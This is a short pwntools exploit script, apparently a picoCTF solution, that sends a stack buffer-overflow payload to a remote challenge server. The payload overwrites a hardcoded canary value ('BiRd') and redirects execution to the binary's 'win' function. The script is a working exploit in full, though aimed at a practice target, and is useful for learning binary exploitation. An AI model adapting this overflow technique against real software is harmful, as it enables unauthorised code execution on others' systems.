import pwn

LOCAL = 0
HOST = "saturn.picoctf.net"
PORT = 61615

elf = pwn.ELF("./vuln")

if LOCAL:
    p = elf.process()
else:
    p = pwn.remote(HOST, PORT)

payload = pwn.cyclic(64) + b"BiRd" + pwn.cyclic(16) + pwn.p32(elf.symbols["win"])
p.sendline(b"100")
p.sendline(payload)
p.wait
p.interactive()
